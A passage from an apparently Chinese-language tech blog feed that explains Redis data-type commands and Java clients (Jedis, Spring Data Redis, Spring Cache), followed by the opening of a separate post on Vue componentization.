&lt;key&gt; &lt;起始位置&gt; &lt;结束位置&gt;</span><br><span class="line"><span class="comment"># 用 value 覆写 key 所存储的字符串值，从起始位置开始</span></span><br><span class="line">setrange &lt;key&gt; &lt;起始位置&gt; &lt;value&gt;</span><br><span class="line"><span class="comment"># 以新换旧，设置新值同时获取旧值</span></span><br><span class="line">getset &lt;key&gt; &lt;value&gt;</span><br></pre></td></tr></table></figure>



<ul>
<li><code>set &lt;key&gt; &lt;value&gt;</code>：设置 key 的值</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164256.png" alt="  "></p>
<hr>
<ul>
<li><code>get &lt;key&gt;</code>：获取指定 key 的值</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164256.png" alt="  "></p>
<hr>
<ul>
<li><code>append &lt;key&gt; &lt;value&gt;</code>： 将给定的 value 追加到原值的末尾</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164256.png" alt="  "></p>
<hr>
<ul>
<li><code>strlen &lt;key&gt;</code>：  获取值长度</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164256.png" alt="  "></p>
<hr>
<ul>
<li><code>setnx &lt;key&gt; &lt;value&gt;</code>：只有在 key 不存在时才设置 key 的值</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164256.png" alt="  "></p>
<hr>
<ul>
<li><code>incr &lt;key&gt;</code>：将 key 存储的数字值 + 1</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164256.png" alt="  "></p>
<hr>
<ul>
<li><code>decr &lt;key&gt;</code>：将 key 存储的数字值 - 1</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164256.png" alt="  "></p>
<hr>
<ul>
<li><code>incrby / decrby &lt;key&gt; &lt;步长&gt;</code>：将 key 中 存储的数字值增减，自定义步长</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164256.png" alt="  "></p>
<hr>
<ul>
<li><code>setex &lt;key&gt; &lt;seconds&gt; &lt;value&gt;</code>：设置指定 key 的值，并将 key 的过期时间设为 seconds 秒</li>
</ul>
<p><strong>将 city 的过期时间设为10秒</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164256.png" alt="  "></p>
<p><strong>在10秒内</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164256.png" alt="  "></p>
<p><strong>10秒后</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164256.png" alt="  "></p>
<hr>
<ul>
<li><code>mset &lt;key1 value1 key2 value2 ..&gt;</code>：同时设置一个或多个 key-value 对</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164256.png" alt="  "></p>
<hr>
<ul>
<li><code>mget &lt;key1 key2 ..&gt;</code>：同时获取一个或多个 value</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164256.png" alt="  "></p>
<ul>
<li><code>msetnx  &lt;key1 value1 key2 value2 ..&gt;</code>：同时设置一个或多个 key-value 对，当且仅当所有给定 key不存在</li>
</ul>
<blockquote>
<p>原子性，有一个失败则都失败</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<hr>
<ul>
<li><code>getrange &lt;key&gt; &lt;起始位置&gt; &lt;结束位置&gt;</code>：获取值的范围，类似切片（索引从 0 开始）</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<hr>
<ul>
<li><code>setrange &lt;key&gt; &lt;起始位置&gt; &lt;value&gt;</code>：用 value 覆写 key 所存储的字符串值，从起始位置开始</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<hr>
<ul>
<li><code>getset &lt;key&gt; &lt;value&gt;</code>：以新换旧，设置新值同时获取旧值</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<hr>
<h2 id="3-列表-list-操作命令"><a href="#3-列表-list-操作命令" class="headerlink" title="3. 列表 list 操作命令"></a>3. 列表 list 操作命令</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<p><strong>Redis列表时简单的字符串列表，按照插入顺序排序，常用命令如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将一个或多个值插入到列表 头部 / 尾部</span></span><br><span class="line">lpush / rpush &lt;key&gt; &lt;value1 value2 ..&gt;</span><br><span class="line"><span class="comment"># 从 头部 / 尾部 吐出一个值</span></span><br><span class="line">lpop / rpop &lt;key&gt;</span><br><span class="line"><span class="comment"># 从 key1 尾部吐出值，插入 key2 头部</span></span><br><span class="line">rpoplpush &lt;key1&gt; &lt;key2&gt;</span><br><span class="line"><span class="comment"># 按照索引下标获取元素</span></span><br><span class="line">lrange &lt;key&gt; &lt;起始位置&gt; &lt;结束位置&gt;</span><br><span class="line"><span class="comment"># 获取列表长度</span></span><br><span class="line">llen &lt;key&gt;</span><br><span class="line"><span class="comment"># 在 value 前面 / 后面插入 newvalue</span></span><br><span class="line">linsert &lt;key&gt; before / after &lt;value&gt; &lt;newvalue&gt;</span><br><span class="line"><span class="comment"># 从左边删除 n 个 value（从左到右）</span></span><br><span class="line">lrem &lt;key&gt; &lt;n&gt; &lt;value&gt;</span><br><span class="line"><span class="comment"># 将列表 key 下标为 index 的值替换为 value</span></span><br><span class="line">lset &lt;key&gt; &lt;index&gt; &lt;value&gt;</span><br><span class="line">BRPOP key1 [key2 ...] <span class="built_in">timeout</span>移除并获取列表的最后一个元素，如果列表没有元素会阻塞列表直到等待超时或发现可弹出元素为止</span><br></pre></td></tr></table></figure>

<ul>
<li><code>lpush / rpush &lt;key&gt; &lt;value1 value2 ..&gt;</code>：将一个或多个值插入到列表 头部 &#x2F; 尾部</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<hr>
<ul>
<li><code>lpop / rpop &lt;key&gt;</code>： 从 头部 &#x2F; 尾部 吐出一个值</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<hr>
<ul>
<li><code>rpoplpush &lt;key1&gt; &lt;key2&gt;</code>：从 key1 尾部吐出值，插入 key2 头部</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<hr>
<ul>
<li><code>llen &lt;key&gt;</code>：获取列表长度</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<hr>
<ul>
<li><code>linsert &lt;key&gt; before / after &lt;value&gt; &lt;newvalue&gt;</code>：在 value 前面 &#x2F; 后面插入 newvalue</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<ul>
<li><code>lrem &lt;key&gt; &lt;n&gt; &lt;value&gt;</code>：从左边删除 n 个 value（从左到右）</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<ul>
<li><code>lset &lt;key&gt; &lt;index&gt; &lt;value&gt;</code>：将列表 key 下标为 index 的值替换为 value</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<hr>
<ul>
<li><strong><code>BRPOP</code> key1 [key2 …] timeout</strong>：移除并获取列表的最后一个元素，如果列表没有元素会阻塞列表直到等待超时或发现可弹出元素为止</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<hr>
<h2 id="4-集合-set-操作命令"><a href="#4-集合-set-操作命令" class="headerlink" title="4. 集合 set 操作命令"></a>4. 集合 set 操作命令</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<p><strong>Redis set是string类型的无序集合、集合成员是唯一的，这就意味着集合中不能出现重复的数据，常用命令如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 向集合中添加一个或多个成员</span></span><br><span class="line">sadd &lt;key&gt; &lt;member1 member2 ..&gt;</span><br><span class="line"><span class="comment"># 返回集合中的所有成员</span></span><br><span class="line">smembers &lt;key&gt;</span><br><span class="line"><span class="comment"># 判断集合 key 是否含有 value,有1;无0</span></span><br><span class="line">sismember &lt;key&gt; &lt;value&gt;</span><br><span class="line"><span class="comment"># 获取集合中元素个数</span></span><br><span class="line">scard &lt;key&gt;</span><br><span class="line"><span class="comment"># 删除集合中某个元素</span></span><br><span class="line">srem &lt;key&gt; &lt;value1 value2 ..&gt;</span><br><span class="line"><span class="comment"># 随机取出集合中的元素，会删除</span></span><br><span class="line">spop &lt;key&gt;</span><br><span class="line"><span class="comment"># 随机从集合中取出 n 个值，不会删除</span></span><br><span class="line">srandmember &lt;key&gt; &lt;n&gt;</span><br><span class="line"><span class="comment"># 把集合中一个值从一个集合移动到另一个集合</span></span><br><span class="line">smove &lt;<span class="built_in">source</span>&gt; &lt;distination&gt; value</span><br><span class="line"><span class="comment"># 返回给定集合的交集</span></span><br><span class="line">sinter &lt;key1 key2 ..&gt;</span><br><span class="line"><span class="comment"># 返回给定集合的并集</span></span><br><span class="line">sunion &lt;key1 key2 ..&gt;</span><br><span class="line"><span class="comment"># 返回给定集合的差集（key1中的，不包含 key2中的）</span></span><br><span class="line">sdiff &lt;key1&gt; &lt;key2&gt;</span><br></pre></td></tr></table></figure>




<ul>
<li><code>sadd &lt;key&gt; &lt;member1 member2 ..&gt;</code>：向集合中添加一个或多个成员</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<ul>
<li><code>sismember &lt;key&gt; &lt;value&gt;</code>：判断集合 key 是否含有 value,有1;无0</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164257.png" alt="  "></p>
<hr>
<ul>
<li><code>scard &lt;key&gt;</code>：获取集合中元素个数</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<ul>
<li><code>srem &lt;key&gt; &lt;value1 value2 ..&gt;</code>： 删除集合中某个元素</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<ul>
<li><code>spop &lt;key&gt;</code>：随机取出集合中的元素，会删除</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<ul>
<li><code>srandmember &lt;key&gt; &lt;n&gt;</code>：随机从集合中取出 n 个值，不会删除</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<ul>
<li><code>smove &lt;source&gt; &lt;distination&gt; value</code>：把集合中一个值从一个集合移动到另一个集合</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<ul>
<li><code>sinter &lt;key1 key2 ..&gt;</code>：返回给定集合的交集</li>
</ul>
<hr>
<ul>
<li><code>sunion &lt;key1 key2 ..&gt;</code>：返回给定集合的并集</li>
</ul>
<hr>
<ul>
<li><code>sdiff &lt;key1&gt; &lt;key2&gt;</code>：返回给定集合的差集（key1中的，不包含 key2中的）</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<h2 id="5-哈希-hash-操作命令"><a href="#5-哈希-hash-操作命令" class="headerlink" title="5. 哈希 hash 操作命令"></a>5. 哈希 hash 操作命令</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<p><strong>Redis hash是一个string类型的 field 和 value 的映射表，hash 特别适合用于存储对象，常用命令如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将哈希表 key 的字段 filed 的值设为 value</span></span><br><span class="line">hset &lt;key&gt; &lt;field&gt; &lt;value&gt;</span><br><span class="line"><span class="comment"># 获取存储在哈希表中指定字段的值</span></span><br><span class="line">hget &lt;key&gt; &lt;field&gt;</span><br><span class="line"><span class="comment"># 获取在哈希表中指定 key 的所有字段和值</span></span><br><span class="line">hgetall &lt;key&gt;</span><br><span class="line"><span class="comment"># 批量设置哈希表 key 的值</span></span><br><span class="line">hmset &lt;key&gt; &lt;field1 value1 field2 value2 ..&gt;</span><br><span class="line"><span class="comment"># 判断哈希表 key 中给定域 field 是否存在（存在1；不存在0）</span></span><br><span class="line">hexists &lt;key&gt; &lt;field&gt;</span><br><span class="line"><span class="comment"># 列出哈希表 key 所有的 field</span></span><br><span class="line">hkeys &lt;key&gt;</span><br><span class="line"><span class="comment"># 列出哈希表 key 所有的 值</span></span><br><span class="line">hvals &lt;key&gt;</span><br><span class="line"><span class="comment"># 为哈希表 key 的域 field 的值加上增量</span></span><br><span class="line">hincrby &lt;key&gt; &lt;field&gt; &lt;increment&gt;</span><br><span class="line"><span class="comment"># 将哈希表 key 的域 field 的值设置为 value,当且仅当域 field 不存在</span></span><br><span class="line">hsetnx &lt;key&gt; &lt;field&gt; &lt;value&gt; </span><br></pre></td></tr></table></figure>


<ul>
<li><code>hset &lt;key&gt; &lt;field&gt; &lt;value&gt;</code>：将哈希表 key 的字段 filed 的值设为 value</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<ul>
<li><code>hget &lt;key&gt; &lt;field&gt;</code>：获取存储在哈希表中指定字段的值</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<ul>
<li><code>hgetall &lt;key&gt;</code>：获取在哈希表中指定 key 的所有字段和值</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<ul>
<li><code>hmset &lt;key&gt; &lt;field1 value1 field2 value2 ..&gt;</code>：批量设置哈希表 key 的值</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<ul>
<li><code>hexists &lt;key&gt; &lt;field&gt;</code>：判断哈希表 key 中给定域 field 是否存在（存在1；不存在0）</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<ul>
<li><code>hkeys &lt;key&gt;</code>： 列出哈希表 key 所有的 field</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<ul>
<li><code>hvals &lt;key&gt;</code>：列出哈希表 key 所有的 值</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<ul>
<li><code>hincrby &lt;key&gt; &lt;field&gt; &lt;increment&gt;</code>：为哈希表 key 的域 field 的值加上增量</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<ul>
<li><code>hsetnx &lt;key&gt; &lt;field&gt; &lt;value&gt; </code>：将哈希表 key 的域 field 的值设置为 value,当且仅当域 field 不存在</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<ul>
<li><code>hdel &lt;key&gt; &lt;field1 field2 ..&gt;</code>：删除存储在哈希表中的指定一个或多个字段</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164258.png" alt="  "></p>
<hr>
<h2 id="6-有序集合-sorted-set-操作命令"><a href="#6-有序集合-sorted-set-操作命令" class="headerlink" title="6. 有序集合 sorted set 操作命令"></a>6. 有序集合 sorted set 操作命令</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164259.png" alt="  "></p>
<p><strong>Redis sorted set有序集合是string类型元素的集合，且不允许重复的成员。每个元素都会关联一个double类型的分数（score）。Redis是通过分数来为集合中的成员进行从小到大排序。有序集合的成员是唯一的，但分数却可以重复。常用命令如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 向有序集合添加一个或多个成员，或者更新已存在成员的分数</span></span><br><span class="line">zadd &lt;key&gt; &lt;score1 member1 score2 member2 ..&gt;</span><br><span class="line"><span class="comment"># 通过索引区间返回有序集合中指定区间内的成员（携带 withscores，可以让分数一起与值返回到结果集）</span></span><br><span class="line">zrange &lt;key&gt; &lt;start&gt; &lt;stop&gt; [withscores]</span><br><span class="line"><span class="comment"># 返回有序集 key 中，所有 score 值介于 min 与 max 之间（包括 min 与 max）的成员，按 score 值递增排列</span></span><br><span class="line">zrangebyscore &lt;key&gt; &lt;min&gt; &lt;max&gt; [withscores] [<span class="built_in">limit</span> offset count]</span><br><span class="line"><span class="comment"># 同上，改为从大到小排列</span></span><br><span class="line">zrevrangebyscore key &lt;max&gt; &lt;min&gt; [withscores] [<span class="built_in">limit</span> offset count]</span><br><span class="line"><span class="comment"># 有序集合中对指定成员的分数加上增量 increment</span></span><br><span class="line">zincrby &lt;key&gt; &lt;increment&gt; &lt;value&gt;</span><br><span class="line"><span class="comment"># 删除该集合下，指定值的元素</span></span><br><span class="line">zrem &lt;key&gt; &lt;value1 value2..&gt;</span><br><span class="line"><span class="comment"># 统计该集合，分数区间内的元素个数</span></span><br><span class="line">zcount &lt;key&gt; &lt;min&gt; &lt;max&gt; </span><br><span class="line"><span class="comment"># 返回该值在集合中的排名，从 0 开始</span></span><br><span class="line">zrank &lt;key&gt; &lt;value&gt; </span><br></pre></td></tr></table></figure>



<ul>
<li><code>zadd &lt;key&gt; &lt;score1 member1 score2 member2 ..&gt;</code>：向有序集合添加一个或多个成员，或者更新已存在成员的分数</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164259.png" alt="  "></p>
<hr>
<ul>
<li><code>zrange &lt;key&gt; &lt;start&gt; &lt;stop&gt; [withscores]</code>：通过索引区间返回有序集合中指定区间内的成员（携带 withscores，可以让分数一起与值返回到结果集）</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164259.png" alt="  "></p>
<hr>
<ul>
<li><code>zrangebyscore &lt;key&gt; &lt;min&gt; &lt;max&gt; [withscores] [limit offset count]</code>：返回有序集 key 中，所有 score 值介于 min 与 max 之间（包括 min 与 max）的成员，按 score 值递增排列</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164259.png" alt="  "></p>
<hr>
<ul>
<li><code>zrevrangebyscore &lt;key&gt; &lt;max&gt; &lt;min&gt; [withscores] [limit offset count]</code>： 同上，改为从大到小排列</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164259.png" alt="  "></p>
<hr>
<ul>
<li><code>zincrby &lt;key&gt; &lt;increment&gt; &lt;value&gt;</code>：有序集合中对指定成员的分数加上增量 increment</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164259.png" alt="  "></p>
<hr>
<ul>
<li><code>zrem &lt;key&gt; &lt;value1 value2..&gt;</code>：删除该集合下，指定值的元素</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164259.png" alt="  "></p>
<hr>
<ul>
<li><code>zcount &lt;key&gt; &lt;min&gt; &lt;max&gt; </code>：统计该集合，分数区间内的元素个数</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164259.png" alt="  "></p>
<hr>
<ul>
<li><code>zrank &lt;key&gt; &lt;value&gt;</code> ：返回该值在集合中的排名，从 0 开始</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164259.png" alt="  "></p>
<hr>
<h1 id="四、Redis新数据类型"><a href="#四、Redis新数据类型" class="headerlink" title="四、Redis新数据类型"></a>四、Redis新数据类型</h1><h2 id="1-Bitmaps"><a href="#1-Bitmaps" class="headerlink" title="1. Bitmaps"></a>1. Bitmaps</h2><h1 id="四、Java操作Redis"><a href="#四、Java操作Redis" class="headerlink" title="四、Java操作Redis"></a>四、Java操作Redis</h1><h2 id="1-简单介绍"><a href="#1-简单介绍" class="headerlink" title="1. 简单介绍"></a>1. 简单介绍</h2><p><strong>Redis的Java客户端有很多，官方推荐的有 3 种：</strong></p>
<ul>
<li>Jedis</li>
<li>Lettuce</li>
<li>Redisson</li>
</ul>
<p>Spring 也对 Redis 客户端做了整合，提供了 Spring Data Redis，在 Spring Boot 项目中还提供了对应的 starter，即 <code>spring-boot-starter-data-redis</code></p>
<h2 id="2-Jedis的简单使用"><a href="#2-Jedis的简单使用" class="headerlink" title="2. Jedis的简单使用"></a>2. Jedis的简单使用</h2><p><strong>Jedis的坐标</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>使用 Jedis 操作 Redis 的步骤：</strong></p>
<blockquote>
<p>① 获取连接<br>② 执行操作<br>③ 关闭连接</p>
</blockquote>
<p><strong>① 获取连接</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 获取连接</span></span><br><span class="line"><span class="type">Jedis</span> <span class="variable">jedis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jedis</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">6379</span>);</span><br></pre></td></tr></table></figure>


<p>② 执行操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2. 执行具体操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串 string 操作</span></span><br><span class="line"><span class="comment">// 设置 key-value</span></span><br><span class="line">jedis.set(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;tyt&quot;</span>);</span><br><span class="line"><span class="comment">// 获取 key 的 value</span></span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> jedis.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;username = &quot;</span> + username);</span><br><span class="line"><span class="comment">// 删除 key</span></span><br><span class="line">jedis.del(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 哈希 hash 操作</span></span><br><span class="line">jedis.hset(<span class="string">&quot;myHash&quot;</span>, <span class="string">&quot;city&quot;</span>, <span class="string">&quot;chongqing&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">city</span> <span class="operator">=</span> jedis.hget(<span class="string">&quot;myHash&quot;</span>, <span class="string">&quot;city&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;city = &quot;</span> + city);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通用操作</span></span><br><span class="line"><span class="comment">// 获取所有 key</span></span><br><span class="line">Set&lt;String&gt; keys = jedis.keys(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;keys = &quot;</span> + keys);</span><br></pre></td></tr></table></figure>


<p><strong>③ 关闭连接</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 3. 关闭连接</span></span><br><span class="line">jedis.close();</span><br></pre></td></tr></table></figure>



<h2 id="3-Spring-Data-Redis"><a href="#3-Spring-Data-Redis" class="headerlink" title="3. Spring Data Redis"></a>3. Spring Data Redis</h2><p><strong>在Spring Boot 项目中，可以使用 Spring Data Redis 来简化Redis操作，坐标如下：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><strong>Spring Data Redis中提供了一个高度封装的类：<code>RedisTemplate</code>，针对jedis客户端中大量api进行了归类封装，将同一类型操作封装成operation接口，具体分类如下：</strong></p>
<ul>
<li>ValueOperations：简单 K-V 操作</li>
<li>SetOperations：set类型数据操作</li>
<li>ZsetOperations：zset类型数据操作</li>
<li>HashOperations：map类型数据操作</li>
<li>ListOperations：list类型数据操作</li>
</ul>
<h2 id="4-Spring-Cache"><a href="#4-Spring-Cache" class="headerlink" title="4. Spring Cache"></a>4. Spring Cache</h2><p>Spring Cache是一个框架，实现了基于注解的缓存功能，只需要简单地加一个注解，就能实现缓存功能。Spring Cache提供了一层抽象，底层可以切换不同的cache实现。具体就是通过<code>CacheManager</code>接口来统一不同的缓存技术。<br><code>CacheManager</code>是Spring提供的各种缓存技术抽象接口。</p>
<p><strong>针对不同的缓存技术实现不同的CacheManager：</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164259.png" alt="  "></p>
<h3 id="1-Spring-Cache常用注解"><a href="#1-Spring-Cache常用注解" class="headerlink" title="1. Spring Cache常用注解"></a>1. Spring Cache常用注解</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164259.png" alt="  "><br><strong>在 SpringBoot中，使用缓存技术只需要在项目中导入相关缓存技术的依赖包，并在&#x3D;&#x3D;启动类&#x3D;&#x3D;上使用<code>@EnableCaching</code>注解开启缓存支持即可。<br>例如：使用Redis作为缓存技术，只需导入Spring Data Redis的Maven坐标即可。</strong></p>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue框架总结（三、Vue组件化以及CLI编程）</title>
    <url>/posts/2077d398.html</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><ul>
<li>所谓<strong>组件化</strong>，就是将页面拆分成多个组件，每个组件依赖的 CSS、JS、模板、图片等资源放在一起开发和维护。</li>
<li>组件在系统内部可复用，组件和组件之间可以嵌套</li>
</ul>
<p>如果项目比较复杂，使用组件可以极大简化代码量，并且对后期的需求变更和维护也更加友好。组件化提供了一种抽象，让我们可以开发一个个独立的可复用的小组件来构建我们的应用。任何的应用都会被抽象成一颗组件树。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144757.png" alt="  "></p>
<hr>
<p><strong>以下引用尚硅谷张天禹老师的两张图，这很清晰明了得指出了传统编程方式的冗杂以及组件化的简化与友好</strong></p>
